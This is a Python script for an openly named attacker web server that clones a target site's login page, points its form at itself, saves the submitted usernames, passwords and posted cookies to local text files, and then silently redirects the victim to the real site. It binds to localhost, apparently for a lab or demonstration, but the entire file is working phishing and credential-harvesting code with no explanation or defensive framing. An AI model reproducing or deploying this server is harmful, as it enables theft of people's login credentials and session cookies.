from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qsl, parse_qs
from cgi import parse_header, parse_multipart
import requests
from bs4 import BeautifulSoup
 

base_login_url = ""

# HTTPRequestHandler class
class AttackerServer_RequestHandler(BaseHTTPRequestHandler):

    def parse_POST(self):
        ctype, pdict = parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            postvars = parse_qs(
                    self.rfile.read(length), 
                    keep_blank_values=1)
        else:
            postvars = {}
        return postvars

    # GET
    def do_GET(self):
        global base_login_url

        url_parsed = urlparse(self.path)
        queries = dict(parse_qsl(url_parsed.query))

        if queries.get('url'):
            url = queries.get("url")

            broken_url = urlparse(url)
            base_login_url = str(broken_url.scheme) + "://" + str(broken_url.netloc)
            print("SET THE BASE LOGIN URL : {}".format(base_login_url))

            r = requests.get(url)
            html = BeautifulSoup(r.content, 'html.parser')
            form = html.find_all("form")[0]
            form['action'] = "/credentials"
            # Send response status code
            self.send_response(200)
            # Send headers
            self.send_header('Content-type','text/html')
            self.end_headers()
            # Send HTML
            self.wfile.write(bytes(html.prettify(), "utf8"))
        
        return

    def do_POST(self):
        global base_login_url
        
        postvars = self.parse_POST()
        print("BASE LOGIN URL: " + base_login_url)

        if "credentials" in self.path:            
            with open("credentials.txt", 'w+') as out_file:
                for k,v in postvars.items():
                    out_file.write(k.decode('UTF-8') + " : " + v[0].decode('UTF-8') + "; ")
        elif "cookies" in self.path:
            with open("cookies.txt", "w+") as out_file:
                for k,v in postvars.items():
                    out_file.write(k.decode('UTF-8') + " : " + v[0].decode('UTF-8') + "; ")

        # Send response status code
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        html = "<html><body><a id='link' target='_parent' href='"
        html += str(base_login_url)
        html += "'></a></body><script>window.onload = function(){{document.getElementById('link').click();}}</script></html>"
        self.wfile.write(bytes(html, "utf8"))
        return 

def run():
    try:
        print('starting server...')
        # Server settings
        # Choose port 8080, for port 80, which is normally used for a http server, you need root access
        server_address = ('127.0.0.1', 8081)
        httpd = HTTPServer(server_address, AttackerServer_RequestHandler)
        print('running server...')
        httpd.serve_forever()
    except:
        print ('^C received, shutting down the web server')
        httpd.socket.close()

run()
 

